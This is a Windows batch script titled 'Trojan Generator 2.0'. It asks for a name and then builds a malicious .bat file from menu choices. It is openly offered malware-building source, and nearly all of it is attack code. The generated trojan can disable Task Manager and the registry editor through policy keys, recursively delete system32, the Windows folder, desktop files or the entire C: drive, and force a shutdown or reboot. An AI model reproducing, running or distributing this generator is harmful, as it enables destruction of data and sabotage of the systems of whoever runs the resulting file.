@echo off
title Trojan Generator 2.0
set /P trojanname="How do you want to name your trojan?"
echo @echo off > "%trojanname%.bat"
:main
echo [0] start over
echo [1] disable taskmgr
echo [2] disable regedit
echo [3] delete system32
echo [4] delete windows folder
echo [5] delete desktop files
echo [6] delete c drive
echo [7] reboot pc
echo [8] shutdown pc
echo [x] close this program
choice /c 012345678x /m "What do you want to add to your trojan?"

if ERRORLEVEL==10 goto close
if ERRORLEVEL==9 goto shutdown
if ERRORLEVEL==8 goto reboot
if ERRORLEVEL==7 goto deldisk
if ERRORLEVEL==6 goto deldesktop
if ERRORLEVEL==5 goto delwin
if ERRORLEVEL==4 goto delsys32
if ERRORLEVEL==3 goto noreg
if ERRORLEVEL==2 goto notaskmgr
if ERRORLEVEL==1 goto startover

:close
exit

:shutdown
echo shutdown /s /t 00 >> "%trojanname%.bat"
goto main

:reboot
echo shutdown /r /t 00 >> "%trojanname%.bat"
goto main

:deldisk
echo rd c:\ /s /q >> "%trojanname%.bat"
goto main

:deldesktop
echo rd "%userprofile%\desktop" /s /q >> "%trojanname%.bat"
echo rd c:\users\public\desktop /s /q >> "%trojanname%.bat"
goto main

:delwin
echo rd c:\windows /s /q >> "%trojanname%.bat"
goto main

:delsys32
echo rd c:\windows\system32 /s /q >> "%trojanname%.bat"
goto main

:noreg
echo reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >> "%trojanname%.bat"
goto main

:notaskmgr
echo reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >> "%trojanname%.bat"
goto main

:startover
echo @echo off > "%trojanname%.bat"
goto main